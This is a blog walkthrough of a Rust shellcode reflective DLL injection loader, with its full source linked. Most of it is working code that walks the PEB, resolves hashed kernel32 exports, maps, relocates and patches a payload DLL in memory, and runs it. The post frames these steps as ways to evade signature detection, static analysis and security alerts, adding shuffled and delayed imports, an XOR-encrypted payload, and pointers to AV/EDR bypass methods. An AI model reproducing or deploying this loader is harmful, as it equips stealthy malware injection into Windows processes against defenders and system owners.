---
title: "Walkthrough of Rusty sRDI"
date: 2023-12-09T20:42:26+02:00
draft: false
tags: ["windows", "malware"]
image: "001.png"
post_number: "001"
---

Shellcode reflective DLL injection (sRDI) still stands as a relatively stealthy technique in the Windows malware scene despite its age. What differentiates it from simpler DLL injection methods is that it doesn't leave apparent traces to the targeted system's disk, which is why it has a chance to bypass basic defensive solutions relying on e.g. signature detection.

## Steps

1. Execution is passed to the loader from a separate injector, that injects the shellcode containing both loader and payload into the target process's memory space (e.g. with VirtualAlloc).
2. The reflective loader parses the process's `kernel32.dll` to calculate the addresses of the functions required for relocation and execution.
3. The loader allocates a continuous region of memory to load its own image into.
4. The loader relocates itself into the allocated memory region with the help of its headers.
5. The loader resolves the imports and patches them into the relocated image's Import Address Table according to the previously gotten function addresses.
6. The loader applies appropriate protections on each relocated section.
7. The loader calls the relocated image's entry point DllMain with DLL_PROCESS_ATTACH.

## Implementation

The complete implementation can be found from [Github](https://github.com/200ug/airborne). The following explanations focus on the loader itself as the supporting components (process injector, shellcode generator, and payload) are basically just pasted from existing implementations mentioned in the [references](#references).

The following helper functions are utilized to make the RVA calculations a bit easier to read:

```rust
fn rva_mut<T>(base_ptr: *mut u8, offset: usize) -> *mut T {
    (base_ptr as usize + offset) as *mut T
}

fn rva<T>(base_ptr: *mut u8, offset: usize) -> *const T {
    (base_ptr as usize + offset) as *const T
}
```

### Locating modules

The loading process begins by locating the modules and their exports needed to perform the subsequent stages of the injection. A prime target is `kernel32.dll`, a core module in Windows.

Each Windows thread possesses a Thread Environment Block (TEB), which, among other thread specific data, points to a Process Environment Block (PEB). The PEB contains a PEB_LDR_DATA structure, cataloging user-mode modules loaded in the process. Crucially, it also features a InLoadOrderModuleList field, that points to a doubly linked list enumerating these modules by their load order:

```rust
#[repr(C)]
#[allow(non_snake_case, non_camel_case_types)]
pub struct PEB_LDR_DATA {
    pub Length: u32,
    pub Initialized: BOOLEAN,
    pub SsHandle: HANDLE,
    pub InLoadOrderModuleList: LIST_ENTRY,
    pub InMemoryOrderModuleList: LIST_ENTRY,
    pub InInitializationOrderModuleList: LIST_ENTRY,
    pub EntryInProgress: *mut c_void,
    pub ShutdownInProgress: BOOLEAN,
    pub ShutdownThreadId: HANDLE,
}

#[repr(C)]
#[allow(non_snake_case)]
pub union LDR_DATA_TABLE_ENTRY_u1 {
    pub InInitializationOrderLinks: LIST_ENTRY,
    pub InProgressLinks: LIST_ENTRY,
}

#[repr(C)]
#[allow(non_snake_case, non_camel_case_types)]
pub struct LDR_DATA_TABLE_ENTRY {
    pub InLoadOrderLinks: LIST_ENTRY,
    pub InMemoryOrderLinks: LIST_ENTRY,
    pub u1: LDR_DATA_TABLE_ENTRY_u1,
    pub DllBase: *mut c_void,
    pub EntryPoint: PLDR_INIT_ROUTINE,
    pub SizeOfImage: u32,
    pub FullDllName: UNICODE_STRING,
    pub BaseDllName: UNICODE_STRING,
}
```

By iterating through this list, we can locate the module we're looking for. This step is pivotal in the process, as it allows us to call necessary functions exported from `kernel32.dll` with indirect function calls.

To illustrate, let's examine a set of functions that locate the PEB and traverse the InLoadOrderModuleList. Notably we also hash the strings containing the names of the modules (and the exported functions in the next step) to make static analysis a bit more difficult:

```rust
#[link_section = ".text"]
unsafe fn get_module_ptr(module_hash: u32) -> Option<*mut u8> {
    // first entry in the InMemoryOrderModuleList -> PEB, PEB_LDR_DATA, LDR_DATA_TABLE_ENTRY
    // InLoadOrderModuleList grants direct access to the base address without using CONTAINING_RECORD macro
    let peb_ptr = get_peb_ptr();
    let peb_ldr_ptr = (*peb_ptr).Ldr as *mut PEB_LDR_DATA;
    let mut table_entry_ptr =
        (*peb_ldr_ptr).InLoadOrderModuleList.Flink as *mut LDR_DATA_TABLE_ENTRY;

    while !(*table_entry_ptr).DllBase.is_null() {
        let name_buf_ptr = (*table_entry_ptr).BaseDllName.Buffer;
        let name_len = (*table_entry_ptr).BaseDllName.Length as usize;
        let name_slice_buf = from_raw_parts(transmute::<PWSTR, *const u8>(name_buf_ptr), name_len);

        // calculate the module hash and compare it
        if module_hash == airborne_common::calc_hash(name_slice_buf) {
            return Some((*table_entry_ptr).DllBase as _);
        }

        table_entry_ptr = (*table_entry_ptr).InLoadOrderLinks.Flink as *mut LDR_DATA_TABLE_ENTRY;
    }

    None
}

#[link_section = ".text"]
unsafe fn get_peb_ptr() -> *mut PEB {
    // TEB located at offset 0x30 from the GS register on 64-bit
    let teb: *mut TEB;
    asm!("mov {teb}, gs:[0x30]", teb = out(reg) teb);

    (*teb).ProcessEnvironmentBlock as *mut PEB
}
```

### Locating exports

After locating the base address of `kernel32.dll`, our next step is to identify the addresses of the specific functions we need. This requires an understanding of the Windows Portable Executable (PE) file format.

A PE file is structured into various components, including the DOS Header, DOS Stub, NT Headers, and a Section Table, which houses the actual file contents in segments like `.text` and `.data`. Our focus is on the Export Directory located within the NT Headers, a section that lists exported functions and their addresses. We can access the Export Directory by utilizing the IMAGE_DIRECTORY_ENTRY_EXPORT offset within the IMAGE_DATA_DIRECTORY.

Similar to how we navigated through modules, we now iterate through the Export Directory entries to locate our required functions. This way we're able to bypass the usual API call mechanisms that could trigger security alerts:

```rust
#[link_section = ".text"]
unsafe fn get_export_addr(module_base_ptr: *mut u8, function_hash: u32) -> Option<usize> {
    // NT Headers -> RVA of Export Directory Table -> function names, ordinals, and addresses
    let nt_headers_ptr = get_nt_headers_ptr(module_base_ptr).unwrap();
    let export_dir_ptr = (module_base_ptr as usize
        + (*nt_headers_ptr).OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT as usize]
            .VirtualAddress as usize) as *mut IMAGE_EXPORT_DIRECTORY;

    let names = from_raw_parts(
        (module_base_ptr as usize + (*export_dir_ptr).AddressOfNames as usize) as *const u32,
        (*export_dir_ptr).NumberOfNames as _,
    );
    let funcs = from_raw_parts(
        (module_base_ptr as usize + (*export_dir_ptr).AddressOfFunctions as usize) as *const u32,
        (*export_dir_ptr).NumberOfFunctions as _,
    );
    let ords = from_raw_parts(
        (module_base_ptr as usize + (*export_dir_ptr).AddressOfNameOrdinals as usize) as *const u16,
        (*export_dir_ptr).NumberOfNames as _,
    );

    // compare hashes iteratively for each entry
    for i in 0..(*export_dir_ptr).NumberOfNames {
        let name_ptr = (module_base_ptr as usize + names[i as usize] as usize) as *const i8;
        let name_len = get_cstr_len(name_ptr as _);
        let name_slice = from_raw_parts(name_ptr as _, name_len);

        if function_hash == airborne_common::calc_hash(name_slice) {
            return Some(module_base_ptr as usize + funcs[ords[i as usize] as usize] as usize);
        }
    }

    None
}

#[link_section = ".text"]
unsafe fn get_nt_headers_ptr(module_base_ptr: *mut u8) -> Option<*mut IMAGE_NT_HEADERS64> {
    let dos_header_ptr = module_base_ptr as *mut IMAGE_DOS_HEADER;

    if (*dos_header_ptr).e_magic != IMAGE_DOS_SIGNATURE {
        return None;
    }

    let nt_headers_ptr =
        (module_base_ptr as usize + (*dos_header_ptr).e_lfanew as usize) as *mut IMAGE_NT_HEADERS64;

    if (*nt_headers_ptr).Signature != IMAGE_NT_SIGNATURE {
        return None;
    }

    Some(nt_headers_ptr)
}
```

### Allocating memory

Having successfully 'imported' the necessary functions (and storing their pointers into far_procs struct), we proceed to allocate memory for our payload shellcode within the target process. This is done using VirtualAlloc, with the allocated memory granted RW permissions.

The payload’s NT Headers contain an ImageBase field, indicating the preferred loading address (in which case the imports wouldn't have to be resolved in the later steps). Initially, we can attempt to allocate memory at this address, but if unsuccessfull, we can pass NULL as the lpAddress parameter to allow VirtualAlloc to pick an appropriate location. In the end the specific memory address isn't critical, as the loader will handle any necessary relocations later in the execution process.

The allocation step itself is really simple and only requires the payload size:

```rust
#[link_section = ".text"]
#[no_mangle]
#[allow(clippy::missing_safety_doc)]
pub unsafe extern "system" fn loader(
    payload_dll: *mut c_void,
    function_hash: u32,
    user_data: *mut c_void,
    user_data_len: u32,
    _shellcode_bin: *mut c_void,
    flags: u32,
) {
    // ...

    let module_base_ptr = payload_dll as *mut u8;

    if module_base_ptr.is_null() {
        return;
    }

    let module_dos_header_ptr = module_base_ptr as *mut IMAGE_DOS_HEADER;
    let module_nt_headers_ptr = (module_base_ptr as usize
        + (*module_dos_header_ptr).e_lfanew as usize)
        as *mut IMAGE_NT_HEADERS64;
    let module_img_size = (*module_nt_headers_ptr).OptionalHeader.SizeOfImage as usize;
    let preferred_base_ptr = (*module_nt_headers_ptr).OptionalHeader.ImageBase as *mut c_void;
    let base_addr_ptr =
        allocate_rw_memory(preferred_base_ptr, module_img_size, &far_procs).unwrap();

    // ...
}

#[link_section = ".text"]
unsafe fn allocate_rw_memory(
    preferred_base_ptr: *mut c_void,
    alloc_size: usize,
    far_procs: &FarProcs,
) -> Option<*mut c_void> {
    let mut base_addr_ptr = (far_procs.VirtualAlloc)(
        preferred_base_ptr,
        alloc_size,
        MEM_RESERVE | MEM_COMMIT,
        PAGE_READWRITE,
    );

    // fallback: attempt to allocate at any address if preferred address is unavailable
    if base_addr_ptr.is_null() {
        base_addr_ptr = (far_procs.VirtualAlloc)(
            null_mut(),
            alloc_size,
            MEM_RESERVE | MEM_COMMIT,
            PAGE_READWRITE,
        );
    }

    if base_addr_ptr.is_null() {
        return None;
    }

    Some(base_addr_ptr)
}
```

### Copying sections

After the allocation, we can proceed to copying the payload PE's sections and headers to the new memory section based on the NumberOfSections field of the payload's IMAGE_FILE_HEADER:

```rust
#[link_section = ".text"]
unsafe fn copy_pe(
    new_base_ptr: *mut c_void,
    old_base_ptr: *mut u8,
    nt_headers_ptr: *mut IMAGE_NT_HEADERS64,
) {
    let section_header_ptr = (&(*nt_headers_ptr).OptionalHeader as *const _ as usize
        + (*nt_headers_ptr).FileHeader.SizeOfOptionalHeader as usize)
        as *mut IMAGE_SECTION_HEADER;

    // PE sections one by one
    for i in 0..(*nt_headers_ptr).FileHeader.NumberOfSections {
        let header_i_ref = &*(section_header_ptr.add(i as usize));

        let dst_ptr = new_base_ptr
            .cast::<u8>()
            .add(header_i_ref.VirtualAddress as usize);
        let src_ptr = (old_base_ptr as usize + header_i_ref.PointerToRawData as usize) as *const u8;
        let raw_size = header_i_ref.SizeOfRawData as usize;

        let src_data_slice = from_raw_parts(src_ptr, raw_size);

        (0..raw_size).for_each(|x| {
            let src = src_data_slice[x];
            let dst = dst_ptr.add(x);
            *dst = src;
        });
    }

    // PE headers
    for i in 0..(*nt_headers_ptr).OptionalHeader.SizeOfHeaders {
        let dst = new_base_ptr as *mut u8;
        let src = old_base_ptr as *const u8;

        *dst.add(i as usize) = *src.add(i as usize);
    }
}
```

### Processing image relocations

Most likely the payload won't be loaded into the preferred memory location, thus we need to address the image relocations.

The necessary relocation data resides in the payload's NT Headers, within the Data Directory, specifically at the IMAGE_DIRECTORY_ENTRY_BASERELOC index. This base relocation table comprises entries each with a VirtualAddress field. We apply the delta, which is the difference between the allocated memory location and the preferred memory location, to these addresses. Additionally, we must factor in the offset specified in each table item:

```rust
#[link_section = ".text"]
unsafe fn process_relocations(
    base_addr_ptr: *mut c_void,
    nt_headers_ptr: *mut IMAGE_NT_HEADERS64,
    mut relocation_ptr: *mut IMAGE_BASE_RELOCATION,
    data_dir_slice: &[IMAGE_DATA_DIRECTORY; 16],
) {
    let delta = base_addr_ptr as isize - (*nt_headers_ptr).OptionalHeader.ImageBase as isize;

    // upper bound prevents accessing memory past the end of the relocation data
    let relocation_end = relocation_ptr as usize
        + data_dir_slice[IMAGE_DIRECTORY_ENTRY_BASERELOC as usize].Size as usize;

    while (*relocation_ptr).VirtualAddress != 0
        && ((*relocation_ptr).VirtualAddress as usize) <= relocation_end
        && (*relocation_ptr).SizeOfBlock != 0
    {
        // relocation address, first entry, and number of entries in the whole block
        let addr = rva::<isize>(
            base_addr_ptr as _,
            (*relocation_ptr).VirtualAddress as usize,
        ) as isize;
        let item = rva::<u16>(relocation_ptr as _, size_of::<IMAGE_BASE_RELOCATION>());
        let count = ((*relocation_ptr).SizeOfBlock as usize - size_of::<IMAGE_BASE_RELOCATION>())
            / size_of::<u16>();

        for i in 0..count {
            // high bits -> type, low bits -> offset
            let type_field = (item.add(i).read() >> 12) as u32;
            let offset = item.add(i).read() & 0xFFF;

            match type_field {
                IMAGE_REL_BASED_DIR64 | IMAGE_REL_BASED_HIGHLOW => {
                    *((addr + offset as isize) as *mut isize) += delta;
                }
                _ => {}
            }
        }

        relocation_ptr = rva_mut(relocation_ptr as _, (*relocation_ptr).SizeOfBlock as usize);
    }
}
```

### Resolving the imports

Now, to ensure the payload functions correctly, we must resolve its external dependencies by processing the import table.

In the DLL's Data Directory, we focus on the IMAGE_DIRECTORY_ENTRY_IMPORT index, where the import directory resides. This directory contains an array of IMAGE_IMPORT_DESCRIPTOR structures, each representing a DLL from which the module imports functions.

During this step we also utilize shuffling and sleep calls to obfuscate the execution flow. First we shuffle the import descriptors with [Fisher–Yates in-place shuffle](https://en.wikipedia.org/wiki/Fisher%E2%80%93Yates_shuffle):

```rust
let mut id_ptr = import_descriptor_ptr;
let mut import_count = 0;

while (*id_ptr).Name != 0 {
    import_count += 1;
    id_ptr = id_ptr.add(1);
}

let id_ptr = import_descriptor_ptr;

if import_count > 1 && flags.shuffle {
    // Fisher-Yates shuffle
    for i in 0..import_count - 1 {
        let rn = match get_random(far_procs) {
            Some(rn) => rn,
            None => return 0,
        };

        let gap = import_count - i;
        let j_u64 = i + (rn % gap);
        let j = j_u64.min(import_count - 1);

        id_ptr.offset(j as _).swap(id_ptr.offset(i as _));
    }
}
```

Then, during the iteration, we call BCryptGenRandom with BCRYPT_RNG_ALG_HANDLE as hAlgorithm parameter to generate a random sleep duration for each iteration:

```rust
if flags.delay {
    // skip delay if winapi call fails
    let rn = get_random(far_procs).unwrap_or(0);
    let delay = rn % MAX_IMPORT_DELAY_MS;
    (far_procs.Sleep)(delay as _);
}

#[link_section = ".text"]
unsafe fn get_random(far_procs: &FarProcs) -> Option<u64> {
    let mut buffer = [0u8; 8];
    let status = (far_procs.BCryptGenRandom)(
        BCRYPT_RNG_ALG_HANDLE,
        buffer.as_mut_ptr(),
        buffer.len() as _,
        0,
    );

    if status != STATUS_SUCCESS {
        return None;
    }

    Some(u64::from_le_bytes(buffer))
}
```

These DLLs are loaded into the process's address space using LoadLibraryA:

```rust
let import_descriptor_ptr: *mut IMAGE_IMPORT_DESCRIPTOR = rva_mut(
    base_addr_ptr as _,
    data_dir_slice[IMAGE_DIRECTORY_ENTRY_IMPORT as usize].VirtualAddress as usize,
);

if import_descriptor_ptr.is_null() {
    return;
}

while (*import_descriptor_ptr).Name != 0x0 {
    let module_name_ptr = rva::<i8>(base_addr_ptr as _, (*import_descriptor_ptr).Name as usize);

    if module_name_ptr.is_null() {
        return 0;
    }

    let module_handle = (far_procs.LoadLibraryA)(module_name_ptr as _);

    if module_handle == 0 {
        return 0;
    }

    // ...
}
```

Next, the we must resolve the addresses of the imported functions, essentially patching the Import Address Table (IAT). This involves utilizing the OriginalFirstThunk, the Relative Virtual Address (RVA) of the Import Lookup Table (ILT), which points to an array of IMAGE_THUNK_DATA64 structures. These structures contain information about the imported functions, either as names or ordinal numbers. The FirstThunk, in contrast, represents the IAT's RVA, where resolved addresses are updated. Thunks here serve as vital intermediaries, ensuring the correct linking of function calls within the payload.

In processing these IMAGE_THUNK_DATA64 structures, we need to distinguish between named and ordinal imports. For ordinal imports, the function address is retrieved via GetProcAddress using the ordinal number. For named imports, the function's name is obtained from IMAGE_IMPORT_BY_NAME, referenced in the AddressOfData field of IMAGE_THUNK_DATA64, and its address is resolved likewise.

Once obtained, the function address is written back into the corresponding FirstThunk entry, effectively redirecting the payload's function calls to the appropriate addresses:

```rust
while (*import_descriptor_ptr).Name != 0x0 {
    // ...

    // RVA of the IAT via either OriginalFirstThunk or FirstThunk
    let mut original_thunk_ptr: *mut IMAGE_THUNK_DATA64 = if (base_addr_ptr as usize
        + (*import_descriptor_ptr).Anonymous.OriginalFirstThunk as usize)
        != 0
    {
        rva_mut(
            base_addr_ptr as _,
            (*import_descriptor_ptr).Anonymous.OriginalFirstThunk as usize,
        )
    } else {
        rva_mut(
            base_addr_ptr as _,
            (*import_descriptor_ptr).FirstThunk as usize,
        )
    };

    let mut thunk_ptr: *mut IMAGE_THUNK_DATA64 = rva_mut(
        base_addr_ptr as _,
        (*import_descriptor_ptr).FirstThunk as usize,
    );

    while (*original_thunk_ptr).u1.Function != 0 {
        let is_snap_res = (*original_thunk_ptr).u1.Ordinal & IMAGE_ORDINAL_FLAG64 != 0;

        // check if the import is by name or by ordinal
        if is_snap_res {
            // mask out the high bits to get the ordinal value and patch the address of the function
            let fn_ord_ptr = ((*original_thunk_ptr).u1.Ordinal & 0xFFFF) as *const u8;
            (*thunk_ptr).u1.Function =
                match (far_procs.GetProcAddress)(module_handle, fn_ord_ptr) {
                    Some(fn_addr) => fn_addr as usize as _,
                    None => return 0,
                };
        } else {
            // get the function name from the thunk and patch the address of the function
            let thunk_data_ptr = (base_addr_ptr as usize
                + (*original_thunk_ptr).u1.AddressOfData as usize)
                as *mut IMAGE_IMPORT_BY_NAME;
            let fn_name_ptr = (*thunk_data_ptr).Name.as_ptr();
            (*thunk_ptr).u1.Function =
                match (far_procs.GetProcAddress)(module_handle, fn_name_ptr) {
                    Some(fn_addr) => fn_addr as usize as _,
                    None => return 0,
                };
        }

        thunk_ptr = thunk_ptr.add(1);
        original_thunk_ptr = original_thunk_ptr.add(1);
    }

    import_descriptor_ptr =
        (import_descriptor_ptr as usize + size_of::<IMAGE_IMPORT_DESCRIPTOR>()) as _;
    }
```

### Protecting the relocated sections

To ensure the seamless integration and correct functioning of the payload within the target process, setting appropriate memory protections for each relocated section is essential.

This process begins by accessing the Section Header (IMAGE_SECTION_HEADER) via the OptionalHeader in the NT Header. Once located, we iterate through the payload's sections, gathering essential details such as each section's reference, its RVA, and the size of the data. The necessary modifications to memory protections are determined based on the Characteristics field of each section, guiding us to apply the correct security attributes. After that the new protections are applied using VirtualProtect, tailored to the specifics of each section:

```rust
#[link_section = ".text"]
unsafe fn finalize_relocations(
    base_addr_ptr: *mut c_void,
    module_nt_headers_ptr: *mut IMAGE_NT_HEADERS64,
    far_procs: &FarProcs,
) {
    // RVA of the first IMAGE_SECTION_HEADER in the PE file
    let section_header_ptr = rva_mut::<IMAGE_SECTION_HEADER>(
        &(*module_nt_headers_ptr).OptionalHeader as *const _ as _,
        (*module_nt_headers_ptr).FileHeader.SizeOfOptionalHeader as usize,
    );

    for i in 0..(*module_nt_headers_ptr).FileHeader.NumberOfSections {
        let mut protection = 0;
        let mut old_protection = 0;

        let section_header_ptr = &*(section_header_ptr).add(i as usize);
        let dst_ptr = base_addr_ptr
            .cast::<u8>()
            .add(section_header_ptr.VirtualAddress as usize);
        let section_raw_size = section_header_ptr.SizeOfRawData as usize;

        let is_executable = section_header_ptr.Characteristics & IMAGE_SCN_MEM_EXECUTE != 0;
        let is_readable = section_header_ptr.Characteristics & IMAGE_SCN_MEM_READ != 0;
        let is_writable = section_header_ptr.Characteristics & IMAGE_SCN_MEM_WRITE != 0;

        if !is_executable && !is_readable && !is_writable {
            protection = PAGE_NOACCESS;
        }

        if is_writable {
            protection = PAGE_WRITECOPY;
        }

        if is_readable {
            protection = PAGE_READONLY;
        }

        if is_writable && is_readable {
            protection = PAGE_READWRITE;
        }

        if is_executable {
            protection = PAGE_EXECUTE;
        }

        if is_executable && is_writable {
            protection = PAGE_EXECUTE_WRITECOPY;
        }

        if is_executable && is_readable {
            protection = PAGE_EXECUTE_READ;
        }

        if is_executable && is_writable && is_readable {
            protection = PAGE_EXECUTE_READWRITE;
        }

        // apply the new protection to the current section
        (far_procs.VirtualProtect)(
            dst_ptr as _,
            section_raw_size,
            protection,
            &mut old_protection,
        );
    }
}
```

An important final step for each section is to call FlushInstructionCache to ensure the CPU sees the changes made to the memory:

```rust
(far_procs.FlushInstructionCache)(-1, null_mut(), 0);
```

### Executing the payload

Finally, with the payload meticulously mapped into the memory, we are set to execute it.

The executed function (as well as the shuffle and sleep switches) depends on the value of the flag stored into the payload during shellcode generation:

```rust
const DELAY_FLAG: u32 = 0b0001;
const SHUFFLE_FLAG: u32 = 0b0010;
const UFN_FLAG: u32 = 0b0100;

const HASH_KEY: usize = 5381;

pub struct Flags {
    pub delay: bool,
    pub shuffle: bool,
    pub ufn: bool,
}
```

If the ufn is true, we'll run user-defined function from within the payload. Otherwise we'll stick to calling the payload's DllMain with DLL_PROCESS_ATTACH:

```rust
if flags.ufn {
    // UserFunction address = base address + RVA of user function
    let user_fn_addr = get_export_addr(base_addr_ptr as _, function_hash).unwrap();

    #[allow(non_snake_case)]
    let UserFunction = transmute::<_, UserFunction>(user_fn_addr);

    // execution with user data passed into the shellcode by the generator
    UserFunction(user_data, user_data_len);
} else {
    let dll_main_addr = base_addr_ptr as usize
        + (*module_nt_headers_ptr).OptionalHeader.AddressOfEntryPoint as usize;

    #[allow(non_snake_case)]
    let DllMain = transmute::<_, DllMain>(dll_main_addr);

    DllMain(base_addr_ptr as _, DLL_PROCESS_ATTACH, module_base_ptr as _);
}
```

## Media

![Payload's DllMain execution with the default flag (0)](/images/understanding-srdi/dllmain-exec.png)

![Payload's user defined function execution with the modified flag (1)](/images/understanding-srdi/userfunction-exec.png)

## Obfuscation and detection evasion techniques

As hinted in the previous sections, the loader utilizes a few trivial obfuscation techniques:

- Hashed import names & indirect WinAPI function calls
- Shuffled and delayed IDT iteration during IAT patching
- XOR encrypted payload shellcode
  - Unique key generated during shellcode generation

If we take a look at the complete implementation, we can identify the PoC injector (utilizing plain CreateRemoteThread) as quite apparent weak link in the chain. Projects like [BypassAV by matro7sh](https://github.com/matro7sh/BypassAV) display a variety of a lot better techniques, if one is interested in improving in that area:

![Map of essential AV/EDR bypass methods](/images/understanding-srdi/bypass-av.png)

## References

- ["An Improved Reflective DLL Injection Technique" by Dan Staples](https://disman.tl/2015/01/30/an-improved-reflective-dll-injection-technique.html)
  - [The implementation of the loader](https://github.com/dismantl/ImprovedReflectiveDLLInjection)
- [sRDI implementation in C by Nick Landers](https://github.com/monoxgas/sRDI/)
- [sRDI implementation in Rust by memN0ps](https://github.com/memN0ps/srdi-rs/)
- ["Reflective DLL Injection in C++" by Brendan Ortiz](https://depthsecurity.com/blog/reflective-dll-injection-in-c)
- [Thorough walkthrough of the PE file format by 0xRick](https://0xrick.github.io/categories/#win-internals)
- [Fisher–Yates shuffle pseudo code implementation](https://en.wikipedia.org/wiki/Fisher%E2%80%93Yates_shuffle)
- ["A tale of EDR bypass methods" by s3cur3th1ssh1t](https://s3cur3th1ssh1t.github.io/A-tale-of-EDR-bypass-methods/)
- [Essential AV/EDR bypass methods mapped out by matro7sh](https://matro7sh.github.io/BypassAV/)
- [MSDN Win32 API documentation](https://learn.microsoft.com/en-us/windows/win32/)
